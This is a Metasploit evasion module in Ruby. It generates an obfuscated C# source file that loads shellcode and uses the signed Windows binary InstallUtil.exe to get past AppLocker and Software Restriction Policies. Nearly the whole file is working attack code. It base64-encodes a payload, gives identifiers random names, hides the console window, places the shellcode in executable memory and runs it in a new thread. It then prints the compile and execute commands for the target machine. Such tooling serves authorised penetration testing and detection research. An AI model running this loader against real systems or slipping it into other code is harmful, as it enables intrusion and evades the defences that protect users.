##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info={})
    super(
      update_info(
        info,
          'Name'        => 'Applocker Evasion - .NET Framework Installation Utility',
          'Description' => %(
                             This module will assist you in evading Microsoft Windows
                             Applocker and Software Restriction Policies.
                             This technique utilises the Microsoft signed binary
                             InstallUtil.exe to execute user supplied code.
                           ),
          'Author'      =>
            [
              'Nick Tyrer <@NickTyrer>', # module development
              'Casey Smith' # install_util bypass research
            ],
          'License'     => 'MSF_LICENSE',
          'Platform'    => 'win',
          'Arch'        => [ARCH_X86, ARCH_X64],
          'Targets'     => [['Microsoft Windows', {}]],
          'References'  => [['URL', 'https://attack.mitre.org/techniques/T1118/']]
      )
    )

    register_options(
      [
        OptString.new('FILENAME', [true, 'Filename for the evasive file (default: install_util.txt)', 'install_util.txt'])
      ]
    )
  end

  def build_payload
    Rex::Text.encode_base64(payload.encoded)
  end

  def obfu
    Rex::Text.rand_text_alpha 8
  end

  def install_util
    esc = build_payload
    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]
    <<~HEREDOC
      using System;
      namespace #{mod[12]}
      {
      public class #{mod[11]} { public static void Main() { } }
      [System.ComponentModel.RunInstaller(true)]
      public class #{mod[10]} : System.Configuration.Install.Installer
      {
      private static Int32 #{mod[0]}=0x1000;
      private static IntPtr #{mod[1]}=(IntPtr)0x40;
      private static UInt32 #{mod[2]} = 0xFFFFFFFF;
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
      [System.Runtime.InteropServices.DllImport("user32.dll")]
      static extern bool ShowWindow(IntPtr #{mod[3]}, int nCmdShow);
      [System.Runtime.InteropServices.DllImport("Kernel32")]
      private static extern IntPtr GetConsoleWindow();
      const int #{mod[4]} = 0;
      public override void Uninstall(System.Collections.IDictionary s)
      {
      IntPtr #{mod[3]};
      #{mod[3]} = GetConsoleWindow();
      ShowWindow(#{mod[3]}, #{mod[4]});
      string #{mod[5]} = "#{esc}";
      byte[] #{mod[6]} = Convert.FromBase64String(#{mod[5]});
      byte[] #{mod[7]} = #{mod[6]};
      IntPtr #{mod[8]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[7]}.Length, #{mod[0]}, #{mod[1]});
      System.Runtime.InteropServices.Marshal.Copy(#{mod[7]}, 0, #{mod[8]}, #{mod[7]}.Length);
      IntPtr #{mod[9]} = IntPtr.Zero;
      WaitForSingleObject(CreateThread(#{mod[9]}, UIntPtr.Zero, #{mod[8]}, #{mod[9]}, 0, ref #{mod[9]}), #{mod[2]});
      }
      }
      }
    HEREDOC
  end

  def file_format_filename(name = '')
    name.empty? ? @fname : @fname = name
  end

  def create_files
    f1 = datastore['FILENAME'].empty? ? 'install_util.txt' : datastore['FILENAME']
    f1 << '.txt' unless f1.downcase.end_with?('.txt')
    file1 = install_util
    file_format_filename(f1)
    file_create(file1)
  end

  def instructions
    print_status "Copy #{datastore['FILENAME']} to the target"
    if payload.arch.first == ARCH_X86
      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:#{datastore['FILENAME'].gsub('.txt', '.exe')} #{datastore['FILENAME']}"
      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U #{datastore['FILENAME'].gsub('.txt', '.exe')}"
    else
      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\csc.exe /out:#{datastore['FILENAME'].gsub('.txt', '.exe')} #{datastore['FILENAME']}"
      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U #{datastore['FILENAME'].gsub('.txt', '.exe')}"
    end
  end

  def run
    create_files
    instructions
  end
end
